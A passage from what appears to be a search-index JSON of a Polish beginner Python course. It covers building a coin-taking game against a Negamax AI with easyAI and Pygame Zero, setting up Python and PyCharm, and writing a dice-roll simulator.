stole\")\n</code></pre>"},{"location":"learning-by-games/python/ai/game-of-coins-ai/#punktacja-ai","title":"Punktacja AI","text":"<p>Aby sztuczna inteligencja mog\u0142a nauczy\u0107 si\u0119 gra\u0107 w nasz\u0105 gr\u0119, musi wiedzie\u0107, kiedy wygrywa, a kiedy nie. W tym celu do\u0142o\u017cymy do naszej gry punktacj\u0119, kt\u00f3r\u0105 zdefiniujemy z pomoc\u0105 metody scoring.</p> <pre><code>class GameOfCoins(TwoPlayerGame):\n    ...\n    def scoring(self):\n</code></pre> <p>Punktacja b\u0119dzie zale\u017cna od tego, ile monet pozosta\u0142o w grze. Gdy monety si\u0119 sko\u0144czy\u0142y, to znaczy, \u017ce sztuczna inteligencja wygra\u0142a i powinna dosta\u0107 punkty. W ka\u017cdym innym przypadku nie przyznajemy punkt\u00f3w.</p> <pre><code>class GameOfCoins(TwoPlayerGame):\n    ...\n    def scoring(self):\n        if self.pile &lt;= 0:\n            return 100\n        else:\n            return 0\n</code></pre>"},{"location":"learning-by-games/python/ai/game-of-coins-ai/#pena-klasa-gry","title":"Pe\u0142na klasa gry","text":"<p>Tak powinna wygl\u0105da\u0107 teraz nasza klasa gry w monety.</p> <pre><code>class GameOfCoins(TwoPlayerGame):\n    def __init__(self, players=None):\n        self.players = players\n        self.pile = 17\n        self.current_player = 1\n\n    def possible_moves(self):\n        return [\"1\", \"3\", \"4\"]\n\n    def make_move(self, move):\n        self.pile -= int(move)\n\n    def is_over(self):\n        return self.pile &lt;= 0\n\n    def show(self):\n        print(f\"{self.pile} monet pozosta\u0142o na stole\")\n\n    def scoring(self):\n        if self.pile &lt;= 0:\n            return 100\n        else:\n            return 0\n</code></pre>"},{"location":"learning-by-games/python/ai/game-of-coins-ai/#tworzymy-gre-i-gramy","title":"Tworzymy gr\u0119 i gramy!","text":"<p>Pod nasz\u0105 klas\u0105, w tzw. kodzie g\u0142\u00f3wnym, utworzymy nast\u0119puj\u0105c\u0105 instrukcj\u0119 warunkow\u0105:</p> <pre><code>if __name__ == \"__main__\":\n</code></pre> <p>Dzi\u0119ki zastosowaniu takiej konstrukcji, kod kt\u00f3ry zaraz napiszemy wykona si\u0119 tylko, gdy uruchomimy ten konkretny plik gry. B\u0119dzie to przydatne p\u00f3\u017aniej, gdy b\u0119dziemy korzysta\u0107 z w\u0142a\u015bnie tworzonego pliku ptzy tworzeniu interfejsu graficznego.</p> <p>W celu utworzenia gry potrzebujemy informacji na temat graczy. Pierwszy z nich b\u0119dzie cz\u0142owiekiem, a drugi b\u0119dzie sztuczn\u0105 inteligencj\u0105. Sztuczna inteligencja musi dzia\u0142a\u0107 wed\u0142ug jakiego\u015b algorytmu, kt\u00f3ry na pocz\u0105tku musimy zdefiniowa\u0107.</p> <pre><code>if __name__ == \"__main__\":\n    algorithm = Negamax(13)\n</code></pre> <p>Skorzystamy z algorytmu Negamax. Jako parametr podajemy liczb\u0119 krok\u00f3w naprz\u00f3d, kt\u00f3re sztuczna inteligencja ma \"przewidywa\u0107\".</p> <p>Teraz tworzymy obiekt naszej gry. Jako parametr podajemy list\u0119 z\u0142o\u017con\u0105 z dw\u00f3ch graczy: gracza sterowanego przez cz\u0142owieka (Human_Player) i gracza sterowanego przez sztuczn\u0105 inteligencj\u0119 (AI_Player).</p> <pre><code>if __name__ == \"__main__\":\n    algorithm = Negamax(13)\n    game = GameOfCoins([Human_Player(), AI_Player(algorithm)])\n</code></pre> <p>Na koniec pozosta\u0142o nam uruchomi\u0107 nasz\u0105 gr\u0119 i zagra\u0107! Czy uda Ci si\u0119 pokona\u0107 sztuczn\u0105 inteligencj\u0119? Spr\u00f3buj r\u00f3\u017cnych parametr\u00f3w przy definiowaniu algorytmu Negamax. Sprawd\u017a jak wp\u0142ywa to na przebieg rozgrywki.</p> <pre><code>if __name__ == \"__main__\":\n    algorithm = Negamax(13)\n    game = GameOfCoins([Human_Player(), AI_Player(algorithm)])\n    game.play()\n</code></pre>"},{"location":"learning-by-games/python/ai/game-of-coins-ai/#pena-gra","title":"Pe\u0142na gra","text":"<pre><code>from easyAI import *\n\nclass GameOfCoins(TwoPlayerGame):\n    def __init__(self, players=None):\n        self.players = players\n        self.pile = 17\n        self.current_player = 1\n\n    def possible_moves(self):\n        return [\"1\", \"3\", \"4\"]\n\n    def make_move(self, move):\n        self.pile -= int(move)\n\n    def is_over(self):\n        return self.pile &lt;= 0\n\n    def show(self):\n        print(f\"{self.pile} monet pozosta\u0142o na stole\")\n\n    def scoring(self):\n        if self.pile &lt;= 0:\n            return 100\n        else:\n            return 0\n\nif __name__ == \"__main__\":\n    algorithm = Negamax(13)\n    game = GameOfCoins([Human_Player(), AI_Player(algorithm)])\n    game.play()\n</code></pre>"},{"location":"learning-by-games/python/ai/game-of-coins-ai/#gra-z-grafika","title":"Gra z grafik\u0105","text":"<p>Teraz zajmiemy si\u0119 tworzeniem graficznej wersji naszej gry z wykorzystaniem Pygame Zero.</p>"},{"location":"learning-by-games/python/ai/game-of-coins-ai/#grafiki-do-pobrania","title":"Grafiki do pobrania","text":"<p>Zanim zaczniemy, pobierz poni\u017csze grafiki, rozpakuj i umie\u015b\u0107 w katalogu images w projekcie gry.</p> <p> Grafiki do gry w monety</p>"},{"location":"learning-by-games/python/ai/game-of-coins-ai/#szablon-gry","title":"Szablon gry","text":"<p>Na pocz\u0105tku utw\u00f3rz nowy plik gameOfCoinsPygame.py. Wewn\u0105trz umieszczamy standardowy szablon.</p> <pre><code>import pgzrun\nimport random\n\nWIDTH = 840\nHEIGHT = 600\n\ndef draw():\n    screen.fill(\"white\")\n\ndef update():\n    pass\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/ai/game-of-coins-ai/#biblioteki","title":"Biblioteki","text":"<p>Poza standardowymi bibliotekami pgzrun i random b\u0119d\u0105 nam jeszcze potrzebne dwie inne: easyAI oraz utworzona przez nas \"biblioteka\" gameOfCoins. Na samej g\u00f3rze dopisujemy wi\u0119c:</p> <pre><code>from gameOfCoins import GameOfCoins\nfrom easyAI import *\n</code></pre>"},{"location":"learning-by-games/python/ai/game-of-coins-ai/#inicjalizacja","title":"Inicjalizacja","text":"<p>Poniewa\u017c kilka element\u00f3w musimy sobie przygotowa\u0107 przed uruchomieniem gry (np. monety, obiekt gry), to utworzymy sobie now\u0105 funkcj\u0119, na ko\u0144cu, zaraz przed <code>pgzrun.go()</code>.</p> <pre><code>...\ndef init():\n    pass\n\npgzrun.go()\n</code></pre> <p>Nasz\u0105 funkcj\u0119 wywo\u0142amy sobie zaraz przed uruchomieniem gry.</p> <pre><code>def init():\n    pass\n\ninit()\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/ai/game-of-coins-ai/#tworzymy-obiekt-gry","title":"Tworzymy obiekt gry","text":"<p>W naszej graficznej wersji b\u0119dziemy korzysta\u0107 z wcze\u015bniej przygotowanej klasy GameOfCoins. W tym celu na pocz\u0105tku kodu, zaraz przed <code>draw()</code>, tworzymy sobie zmienn\u0105 game, kt\u00f3ra na wst\u0119pnie b\u0119dzie mia\u0142a przypisan\u0105 pust\u0105 warto\u015b\u0107.</p> <pre><code>...\ngame = None\n\ndef draw():\n    ...\n</code></pre> <p>W cz\u0119\u015bci inicjalizuj\u0105cej utworzymy obiekt naszej gry, a tak\u017ce zdefiniujemy graczy, podobnie jak robili\u015bmy wcze\u015bniej.</p> <pre><code>...\ndef init():\n    global game\n\n    algorithm = Negamax(13)\n    game = GameOfCoins([Human_Player(), AI_Player(algorithm)])\n...\n</code></pre>"},{"location":"learning-by-games/python/ai/game-of-coins-ai/#przygotowujemy-monety","title":"Przygotowujemy monety","text":"<p>Monety b\u0119dziemy przechowywa\u0107 w li\u015bcie, kt\u00f3r\u0105 tworzymy na pocz\u0105tku kodu:</p> <pre><code>...\ncoins = []\n\ndef draw():\n    ...\n</code></pre> <p>Nasze monety przygotujemy sobie w cz\u0119\u015bci inicjalizuj\u0105cej.</p> <pre><code>...\ndef init():\n    ...\n    x = 55\n    y = 50\n\n    for i in range(1, game.pile + 1):\n        coins.append(Actor(\"coin\", (x, y)))\n        x += 84 + 20\n\n        if i % 8 == 0:\n            y += 84 + 30\n            x = 55\n...\n</code></pre> <p>Wy\u015bwietlamy monety na ekranie w cz\u0119\u015bci rysuj\u0105cej draw.</p> <pre><code>...\ndef draw():\n    ...\n    for cn in coins:\n        cn.draw()\n...\n</code></pre> <p>Po uruchomieniu powinni\u015bmy zobaczy\u0107 kilka rz\u0119d\u00f3w monet na ekranie.</p>"},{"location":"learning-by-games/python/ai/game-of-coins-ai/#przygotowujemy-dostepne-ruchy","title":"Przygotowujemy dost\u0119pne ruchy","text":"<p>Dost\u0119pne dla gracza ruchy b\u0119dziemy reprezentowa\u0107 za pomoc\u0105 ko\u015bci do gry. Na pocz\u0105tku przygotowujemy pust\u0105 list\u0119 ko\u015bci.</p> <pre><code>...\ndices = []\n\ndef draw():\n    ...\n</code></pre> <p>Teraz czas wype\u0142ni\u0107 nasz\u0105 list\u0119 odpowiednimi warto\u015bciami.</p> <pre><code>...\ndef init():\n    ...\n    x = WIDTH / 2 - (len(game.possible_moves()) * 88 - 20) / 2 + 34\n    y = HEIGHT - 88\n    for move in game.possible_moves():\n        dices.append(Actor(f\"dice{move}\", (x, y)))\n        x += 68 + 20\n...\n</code></pre> <p>Mo\u017cemy ju\u017c wy\u015bwietli\u0107 ko\u015bci na ekranie.</p> <pre><code>...\ndef draw():\n    ...\n    for die in dices:\n        die.draw()\n...\n</code></pre> <p>Jak teraz uruchomimy gr\u0119, powinni\u015bmy zobaczy\u0107 ko\u015bci z mo\u017cliwymi do wykonania ruchami.</p>"},{"location":"learning-by-games/python/ai/game-of-coins-ai/#usuwamy-monety","title":"Usuwamy monety","text":"<p>Zanim przejdziemy do wykonywania ruch\u00f3w to przyda nam si\u0119 dodatkowa funkcja do usuwania monet z planszy, kt\u00f3r\u0105 nazwiemy remove_coins. Umieszczamy j\u0105 przed funkcj\u0105 init.</p> <pre><code>...\ndef remove_coins(number):\n    for i in range(number):\n        coins.pop()\n\ndef init():\n    ...\n</code></pre>"},{"location":"learning-by-games/python/ai/game-of-coins-ai/#odczytujemy-ruch-gracza","title":"Odczytujemy ruch gracza","text":"<p>Teraz mo\u017cemy przej\u015b\u0107 do odczytania ruchu gracza. Tworzymy funkcj\u0119 on_mouse_down, kt\u00f3ra pozwala nam odczytywa\u0107 klikni\u0119cia myszy. Umieszczamy j\u0105 pod funkcj\u0105 update.</p> <pre><code>...\ndef update():\n    ...\n\ndef on_mouse_down(pos):\n    for i in range(len(dices)):\n        if dices[i].collidepoint(pos) and game.current_player == 1:\n            move = game.possible_moves()[i]\n            if int(move) &lt;= game.pile:\n                game.play_move(move)\n                remove_coins(int(move))\n...\n</code></pre>"},{"location":"learning-by-games/python/ai/game-of-coins-ai/#wykonujemy-ruch-ai","title":"Wykonujemy ruch AI","text":"<p>Teraz przysz\u0142a wreszcie pora na ruch sztucznej inteligencji. Ruchy AI b\u0119dziemy wykonywa\u0107 w cz\u0119\u015bci aktualizuj\u0105cej update.</p> <pre><code>...\ndef update():\n    if game.current_player == 2 and not game.is_over():\n        move = game.get_move()\n        remove_coins(int(move))\n        game.play_move(move)\n...\n</code></pre> <p>Teraz mo\u017cemy ju\u017c zagra\u0107 ze sztuczn\u0105 inteligencj\u0105!</p>"},{"location":"learning-by-games/python/ai/game-of-coins-ai/#pena-gra_1","title":"Pe\u0142na gra","text":"<pre><code>import pgzrun\nfrom gameOfCoins import GameOfCoins\nfrom easyAI import *\nimport random\n\nWIDTH = 840\nHEIGHT = 600\n\ngame = None\n\ndices = []\n\ncoins = []\n\nwin = 0\ntimer = 120\n\ndef draw():\n    screen.fill(\"white\")\n    for die in dices:\n        die.draw()\n\n    for cn in coins:\n        cn.draw()\n\n    if win == 1:\n        screen.draw.text(\"You win!\", center=(WIDTH / 2, HEIGHT / 3), color=\"blue\", fontsize=120)\n    elif win == 2:\n        screen.draw.text(\"AI wins!\", center=(WIDTH / 2, HEIGHT / 3), color=\"blue\", fontsize=120)\n    elif timer &gt; 0 and game.current_player == 2:\n        screen.draw.text(\"AI thinks...\", center=(WIDTH / 2, HEIGHT - 200), color=\"red\", fontsize=90)\n    elif game.current_player == 1:\n        screen.draw.text(\"Your move!\", center=(WIDTH / 2, HEIGHT - 200), color=\"red\", fontsize=90)\n\ndef update():\n    global win, timer\n\n    timer -= 1\n\n    if game.current_player == 2 and not game.is_over() and timer &lt;= 0:\n        move = game.get_move()\n        remove_coins(int(move))\n        game.play_move(move)\n\n        if game.is_over():\n            win = 1\n\ndef on_mouse_down(pos):\n    global win, timer\n\n    for i in range(len(dices)):\n        if dices[i].collidepoint(pos) and game.current_player == 1:\n            move = game.possible_moves()[i]\n            if int(move) &lt;= game.pile:\n                game.play_move(move)\n                remove_coins(int(move))\n                timer = random.randint(120, 260)\n\n                if game.is_over():\n                    win = 2\n\ndef remove_coins(number):\n    for i in range(number):\n        coins.pop()\n\ndef init():\n    global game\n\n    algorithm = Negamax(13)\n\n    game = GameOfCoins([Human_Player(), AI_Player(algorithm)])\n\n    x = WIDTH / 2 - (len(game.possible_moves()) * 88 - 20) / 2 + 34\n    y = HEIGHT - 88\n    for move in game.possible_moves():\n        dices.append(Actor(f\"dice{move}\", (x, y)))\n        x += 68 + 20\n\n    x = 55\n    y = 50\n\n    for i in range(1, game.pile + 1):\n        coins.append(Actor(\"coin\", (x, y)))\n        x += 84 + 20\n\n        if i % 8 == 0:\n            y += 84 + 30\n            x = 55\n\ninit()\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/introduction/","title":"Wprowadzenie","text":"<p>Zanim zaczniemy, nale\u017cy skonfigurowa\u0107 nasze \u015brodowisko programistyczne. B\u0119dziemy u\u017cywa\u0107 Pythona w wersji 3, a jako IDE (program, w kt\u00f3rym b\u0119dziemy pisa\u0107 nasze programy) wybierzemy PyCharm Community Edition. Oczywi\u015bcie mo\u017cna skorzysta\u0107 z dowolnego \u015brodowiska, ale to uwa\u017cam osobi\u015bcie za jedno z lepszych i do niego b\u0119d\u0119 si\u0119 odwo\u0142ywa\u0142 w tym kursie.</p>"},{"location":"learning-by-games/python/introduction/#instalacja","title":"Instalacja","text":""},{"location":"learning-by-games/python/introduction/#python-3","title":"Python 3","text":"<p>Zaczynamy od zainstalowania interpretera do j\u0119zyka Python. Mo\u017cna go pobra\u0107 z tej strony:</p> <p>https://www.python.org/downloads/</p> <p>Je\u017celi nie wiesz, kt\u00f3r\u0105 wersj\u0119 wybra\u0107, po prostu pobierz najnowsz\u0105 dla swojego systemu operacyjnego. Najwa\u017cniejsze, \u017ceby by\u0142 to Python 3, nie Python 2, poniewa\u017c jest pomi\u0119dzy nimi kilka istotnych r\u00f3\u017cnic, nawet na podstawowym poziomie.</p>"},{"location":"learning-by-games/python/introduction/#pycharm","title":"PyCharm","text":"<p>Nast\u0119pnie pobieramy i instalujemy \u015brodowisko programistyczne:</p> <p>https://www.jetbrains.com/pycharm/download/</p> <p>Darmowa wersja Community stanowczo wystarczy do nauki j\u0119zyka i tworzenia w\u0142asnych gier.</p>"},{"location":"learning-by-games/python/introduction/dice-simulator/","title":"Symulacja rzutu ko\u015bci\u0105","text":""},{"location":"learning-by-games/python/introduction/dice-simulator/#wstep","title":"Wst\u0119p","text":"<p>Losowo\u015b\u0107 w grach jest bardzo wa\u017cna, to dzi\u0119ki niej r\u00f3\u017cne mechaniki gry i jej postaci mog\u0105 zachowywa\u0107 si\u0119 w nieprzewidywalny spos\u00f3b. Dlatego, zanim przejdziemy dalej, potrzebujemy zrozumie\u0107, jak mo\u017cemy skorzysta\u0107 z losowo\u015bci w Pythonie. </p> <p>Jako przyk\u0142ad losowo\u015bci cz\u0119sto podaje si\u0119 rzut ko\u015bci\u0105: aby wylosowa\u0107 liczb\u0119 od \\(1\\) do \\(6\\), rzu\u0107 ko\u015bci\u0105. To w\u0142a\u015bnie zrobimy. Napiszemy symulator rzutu ko\u015bci\u0105, a dok\u0142adniej program, kt\u00f3ry b\u0119dzie losowa\u0142 liczb\u0119 od \\(1\\) do \\(6\\) i wypisywa\u0142 j\u0105 na ekranie.</p>"},{"location":"learning-by-games/python/introduction/dice-simulator/#czego-sie-nauczysz","title":"Czego si\u0119 nauczysz","text":"<ul> <li>Losowania liczby z zadanego przedzia\u0142u.</li> <li>Wykorzystania p\u0119tli iteracyjnej do powtarzania operacji.</li> <li>Zliczania liczby \"udanych\" rzut\u00f3w.</li> </ul>"},{"location":"learning-by-games/python/introduction/dice-simulator/#pojedynczy-rzut","title":"Pojedynczy rzut","text":"<p>Zaczniemy od pojedynczego rzutu ko\u015bci\u0105. Zamys\u0142 jest prosty: program losuje liczb\u0119 od \\(1\\) do \\(6\\), a nast\u0119pnie wypisuje j\u0105 na ekranie z odpowiednim komunikatem.</p> <p>Info</p> <p>Now\u0105 gr\u0119 mo\u017cesz utworzy\u0107 w nowym projekcie, albo mo\u017cesz doda\u0107 nowy plik do swojego poprzedniego projektu.</p>"},{"location":"learning-by-games/python/introduction/dice-simulator/#losujemy-liczbe","title":"Losujemy liczb\u0119","text":"<p>Na pocz\u0105tku, \u017ceby m\u00f3c skorzysta\u0107 z losowo\u015bci w Pythonie, musimy zaimportowa\u0107 odpowiedni\u0105 bibliotek\u0119. Na bibliotek\u0119 w programowaniu mo\u017cna patrze\u0107 jak na zbi\u00f3r narz\u0119dzi. W Pythonie cz\u0119\u015b\u0107 z takich narz\u0119dzi dost\u0119pna jest od r\u0119ki, jak np. polecenie <code>input</code> do wczytania wej\u015bcia od u\u017cytkownika. Wiele jednak takich polece\u0144 znajduje si\u0119 w\u0142a\u015bnie w osobnych bibliotekach.</p> <p>Do liczb losowych potrzebna b\u0119dzie nam biblioteka <code>random</code>, kt\u00f3r\u0105 importujemy poleceniem:</p> <pre><code>import random\n</code></pre> <p>Teraz mo\u017cemy ju\u017c skorzysta\u0107 z polecenia losuj\u0105cego liczb\u0119 z zadanego przedzia\u0142u. Polecenie nazywa si\u0119 <code>randint</code> (losowa liczba ca\u0142kowita), \u017ceby jednak z niego skorzysta\u0107, nale\u017cy je poprzedzi\u0107 nazw\u0105 biblioteki i kropk\u0105, tzn. <code>random.randint</code>.</p> <p>Info</p> <p>Spos\u00f3b korzystania z bibliotek i zawartych w nich polece\u0144/funkcji zale\u017cy od tego, jak bibliotek\u0119 zaimportujemy.</p> <p>Polecenie randint przyjmuje dwa parametry: pocz\u0105tek i koniec przedzia\u0142u, z jakiego chcemy wylosowa\u0107 liczb\u0119. Innymi s\u0142owy musimy poda\u0107 zakres od do. W naszym przypadku b\u0119dzie to odpowiednio \\(1\\) i \\(6\\).</p> <pre><code>random.randint(1, 6)\n</code></pre> <p>Nie wystarczy jednak tylko wywo\u0142a\u0107 polecenie losuj\u0105ce liczb\u0119 z zadanego przedzia\u0142u, trzeba jeszcze gdzie\u015b zapisa\u0107 wynik tego polecenia, tzn. wylosowan\u0105 liczb\u0119. Zapiszemy j\u0105 w zmiennej <code>wynik</code>:</p> <pre><code>wynik = random.randint(1, 6)\n</code></pre>"},{"location":"learning-by-games/python/introduction/dice-simulator/#wypisujemy-wynik","title":"Wypisujemy wynik","text":"<p>Teraz pozosta\u0142o nam wypisa\u0107 <code>wynik</code>, korzystaj\u0105c z polecenia <code>print</code>:</p> <pre><code>print(\"Ko\u015bci zosta\u0142y rzucone. Wynik to:\", wynik)\n</code></pre>"},{"location":"learning-by-games/python/introduction/dice-simulator/#peen-program-z-komentarzami","title":"Pe\u0142en program z komentarzami","text":"<pre><code># Importujemy bibliotek\u0119, kt\u00f3ra pozwoli nam generowa\u0107 losowe liczby\nimport random\n\n# Symulujemy rzut ko\u015bci\u0105 losuj\u0105c liczb\u0119 ca\u0142kowit\u0105 z przedzia\u0142u od 1 do 6\nwynik = random.randint(1, 6)\n\n# Wypisujemy wylosowan\u0105 warto\u015b\u0107 na ekranie\nprint(\"Ko\u015bci zosta\u0142y rzucone. Wynik to:\", wynik)\n</code></pre>"},{"location":"learning-by-games/python/introduction/dice-simulator/#testujemy-dziaanie","title":"Testujemy dzia\u0142anie","text":"<p>Czas przetestowa\u0107 nasz program. Warto uruchomi\u0107 go kilkukrotnie. Czy za ka\u017cdym razem uzyskamy inny wynik? A mo\u017ce wyniki b\u0119d\u0105 si\u0119 powtarza\u0107?</p> <p>Wybierz jak\u0105\u015b liczb\u0119 od \\(1\\) do \\(6\\). Za kt\u00f3rym uruchomieniem program j\u0105 wylosowa\u0142?</p> <p>Spr\u00f3buj tak\u017ce zmieni\u0107 zakres losowanych warto\u015bci i sprawdzi\u0107, jak to wp\u0142ynie na dzia\u0142anie programu.</p> <p>Poni\u017cej tak\u017ce mo\u017cesz sprawdzi\u0107, jakie liczby zostan\u0105 wylosowane.</p> <p>https://replit.com/@damiankurpiewski/Kosci1</p>"},{"location":"learning-by-games/python/introduction/dice-simulator/#wielokrotny-rzut","title":"Wielokrotny rzut","text":"<p>Wiemy ju\u017c jak symulowa\u0107 pojedynczy rzut ko\u015bci\u0105. Czasem jednak potrzebujemy rzuci\u0107 kilkoma ko\u015b\u0107mi naraz, np. dwiema. Mo\u017cemy oczywi\u015bcie wielokrotnie uruchomi\u0107 powy\u017cszy program, ale nie jest to zbyt wygodne. Zmodyfikujmy go wi\u0119c tak, by\u015bmy mogli poda\u0107, ile rzut\u00f3w ko\u015bci\u0105 ma zosta\u0107 wykonanych.</p>"},{"location":"learning-by-games/python/introduction/dice-simulator/#wczytujemy-dane","title":"Wczytujemy dane","text":"<p>Do powt\u00f3rzenia rzutu ko\u015bci\u0105 skorzystamy z p\u0119tli iteracyjnej. Zanim jednak do tego przejdziemy, musimy si\u0119 dowiedzie\u0107 od u\u017cytkownika, ile rzut\u00f3w ko\u015bci\u0105 mamy wykona\u0107:</p> <pre><code>input(\"Podaj liczb\u0119 rzut\u00f3w ko\u015bci\u0105:\")\n</code></pre> <p>Oczekujemy od u\u017cytkownika liczby naturalnej, wi\u0119c musimy skorzysta\u0107 z polecenia <code>int</code>, aby zamieni\u0107 wczytan\u0105 warto\u015b\u0107 na liczb\u0119. Mo\u017cemy to zrobi\u0107 w jednej linii, bez korzystania z pomocniczej zmiennej, tak jak to robili\u015bmy wcze\u015bniej:</p> <pre><code>int(input(\"Podaj liczb\u0119 rzut\u00f3w ko\u015bci\u0105: \"))\n</code></pre> <p>Wynik polecenia zapiszemy w zmiennej <code>ile_razy</code>:</p> <pre><code>ile_razy = int(input(\"Podaj liczb\u0119 rzut\u00f3w ko\u015bci\u0105: \"))\n</code></pre>"},{"location":"learning-by-games/python/introduction/dice-simulator/#powtarzamy-rzuty-koscia","title":"Powtarzamy rzuty ko\u015bci\u0105","text":"<p>Teraz ju\u017c wiemy, ile rzut\u00f3w ko\u015bci\u0105 mamy wykona\u0107. Wiemy te\u017c, z poprzedniego \u0107wiczenia, jak wykona\u0107 pojedynczy rzut ko\u015bci\u0105. W celu powt\u00f3rzenia tej operacji zadan\u0105 liczb\u0119 razy, skorzystamy z p\u0119tli iteracyjnej <code>for</code>:</p> <pre><code>for i in range(ile_razy):\n</code></pre> <p>Teraz w p\u0119tli wykonujemy rzut ko\u015bci\u0105 z poprzedniego \u0107wiczenia:</p> <pre><code>for i in range(ile_razy):\n    wynik = random.randint(1, 6)\n</code></pre> <p>Aby by\u0142o wiadomo, \u017ce ta operacja ma zosta\u0107 wykonana wewn\u0105trz p\u0119tli (czyli ma zosta\u0107 powt\u00f3rzona zadan\u0105 liczb\u0119 razy), to zapisujemy j\u0105 z pojedynczym wci\u0119ciem (tabulacj\u0105).</p> <p>Warning</p> <p>Wci\u0119cia s\u0105 bardzo wa\u017cne w j\u0119zyku Python, wi\u0119c zwracaj na nie uwag\u0119! Cz\u0119sto sprawdzaj, czy kolejne linijki s\u0105 poprawnie wyr\u00f3wnane i nie ma jakiej\u015b dodatkowej, niechcianej spacji.</p> <p>Je\u017celi gdzie\u015b zastosujemy nieprawid\u0142owe wci\u0119cia, to przy pr\u00f3bie uruchomienia naszego programu Python wy\u015bwietli nam w konsoli napis \"IndentationError\".</p> <p>Nie wystarczy jednak samo wylosowanie liczby, przyda\u0142oby si\u0119 j\u0105 tak\u017ce wypisa\u0107 na ekranie. To tak\u017ce musimy wykona\u0107 wewn\u0105trz p\u0119tli, dlatego pami\u0119tamy o wci\u0119ciu.</p> <pre><code>for i in range(ile_razy):\n    wynik = random.randint(1, 6)\n    print(\"Ko\u015bci zosta\u0142y rzucone. Wynik to:\", wynik)\n</code></pre> <p>Na koniec \u0142\u0105czymy wszystko w ca\u0142o\u015b\u0107, pami\u0119taj\u0105c o zaimportowaniu biblioteki <code>random</code> do liczb losowych.</p>"},{"location":"learning-by-games/python/introduction/dice-simulator/#peen-program-z-komentarzami_1","title":"Pe\u0142en program z komentarzami","text":"<pre><code># Importujemy bibliotek\u0119, kt\u00f3ra pozwoli nam generowa\u0107 losowe liczby\nimport random\n\n# Wczytujemy od u\u017cytkownika liczb\u0119 rzut\u00f3w ko\u015bci\u0105, kt\u00f3re mamy zasymulowa\u0107\nile_razy = int(input(\"Podaj liczb\u0119 rzut\u00f3w ko\u015bci\u0105: \"))\n\n# W p\u0119tli od 0 do liczby rzut\u00f3w minus 1\nfor i in range(ile_razy):\n    # Symulujemy rzut ko\u015bci\u0105 losuj\u0105c liczb\u0119 ca\u0142kowit\u0105 z przedzia\u0142u od 1 do 6\n    wynik = random.randint(1, 6)\n\n    # Wypisujemy wylosowan\u0105 warto\u015b\u0107 na ekranie\n    print(\"Ko\u015bci zosta\u0142y rzucone. Wynik to:\", wynik)\n</code></pre>"},{"location":"learning-by-games/python/introduction/dice-simulator/#testujemy-dziaanie_1","title":"Testujemy dzia\u0142anie","text":"<p>Uruchamiamy sw\u00f3j program i sprawdzamy, jakie wyniki tym razem dostaniemy.</p> <p>Mo\u017cesz tak\u017ce sprawdzi\u0107 dzia\u0142anie programu poni\u017cej.</p> <p>https://replit.com/@damiankurpiewski/Kosci2</p>"},{"location":"learning-by-games/python/introduction/dice-simulator/#wielokrotny-rzut-ze-zliczaniem","title":"Wielokrotny rzut ze zliczaniem","text":"<p>Wiemy ju\u017c, jak symulowa\u0107 zar\u00f3wno pojedynczy jak i wielokrotny rzut ko\u015bci\u0105. Powiedzmy jednak, \u017ce chcemy sprawdzi\u0107 swoje szcz\u0119\u015bcie: interesuje nas, ile razy uda nam si\u0119 wylosowa\u0107 sz\u00f3stk\u0119. W tym celu b\u0119dziemy tak jak wcze\u015bniej wielokrotnie rzuca\u0107 ko\u015bci\u0105, a po drodze b\u0119dziemy tak\u017ce zlicza\u0107, ile razy wypad\u0142a nam sz\u00f3stka.</p>"},{"location":"learning-by-games/python/introduction/dice-simulator/#dodajemy-zliczanie-szostek","title":"Dodajemy zliczanie sz\u00f3stek","text":"<p>Zmodyfikujemy program z poprzedniego \u0107wiczenia. W celu zliczania, ile razy uda\u0142o nam si\u0119 wyrzuci\u0107 sz\u00f3stk\u0119, b\u0119dziemy potrzebowali nowej zmiennej, kt\u00f3r\u0105 nazwiemy <code>szostki</code> (do nazw zmiennych nie u\u017cywamy polskich znak\u00f3w). Powinni\u015bmy j\u0105 utworzy\u0107 przed p\u0119tl\u0105, zanim przyst\u0105pimy do zliczania. Musimy jej oczywi\u015bcie nada\u0107 jak\u0105\u015b warto\u015b\u0107 pocz\u0105tkow\u0105. Tak jak to bywa w zliczaniu rzeczy, zaczynamy liczy\u0107 od zera:</p> <pre><code>szostki = 0\n</code></pre> <p>Info</p> <p>By\u0107 mo\u017ce pomy\u015blisz sobie: \"Przecie\u017c liczenie zaczynamy zawsze od jedynki!\". Masz tutaj po cz\u0119\u015bci racj\u0119. Gdy liczymy jakie\u015b przedmioty to rzeczywi\u015bcie zaczynami liczy\u0107 od jedynki. Ale to dlatego, \u017ce na samym pocz\u0105tku ju\u017c zliczamy pierwszy przedmiot!</p> <p>W naszym przypadku (i w przypadku wi\u0119kszo\u015bci program\u00f3w) liczenie zaczynamy jeszcze przed rzutami ko\u015bci\u0105, czyli przed policzeniem chocia\u017cby jednej sz\u00f3stki. W takim razie w tym momencie nie wyrzucili\u015bmy jeszcze \u017cadnej sz\u00f3stki, co znaczy, \u017ce wyrzucili\u015bmy ich dok\u0142adnie zero!</p> <p>Teraz zastan\u00f3wmy si\u0119, jak i w kt\u00f3rym miejscu w naszym kodzie powinni\u015bmy zlicza\u0107 wylosowane sz\u00f3stki. Oczywi\u015bcie musimy to robi\u0107 po ka\u017cdym rzucie. Za ka\u017cd\u0105 wylosowan\u0105 sz\u00f3stk\u0119 b\u0119dziemy zwi\u0119ksza\u0107 nasz licznik <code>szostki</code> o \\(1\\). Jak jednak sprawdzi\u0107, czy wylosowali\u015bmy w\u0142a\u015bnie sz\u00f3stk\u0119? Do tego b\u0119dzie nam potrzebna instrukcja warunkowa. </p> <p>Info</p> <p>Instrukcja warunkowa pozwala nam wykona\u0107 dany fragment kodu tylko wtedy, gdy jest spe\u0142niony zadany warunek. Mo\u017cna to pokaza\u0107 na przyk\u0142adzie \u015bwiate\u0142 drogowych: je\u017celi \u015bwiat\u0142o jest zielone, to id\u017a.</p> <p>Najpierw, korzystaj\u0105c z instrukcji warunkowej sprawdzamy, czy uda\u0142o nam si\u0119 wylosowa\u0107 sz\u00f3stk\u0119. W tym celu przyr\u00f3wnujemy <code>wynik</code> do liczby \\(6\\) :</p> <pre><code>    if wynik == 6:\n</code></pre> <p>Je\u017celi faktycznie uda\u0142o nam si\u0119 wylosowa\u0107 sz\u00f3stk\u0119, to powinni\u015bmy zwi\u0119kszy\u0107 nasz licznik sz\u00f3stek, czyli zmienn\u0105 <code>szostki</code>:</p> <pre><code>    if wynik == 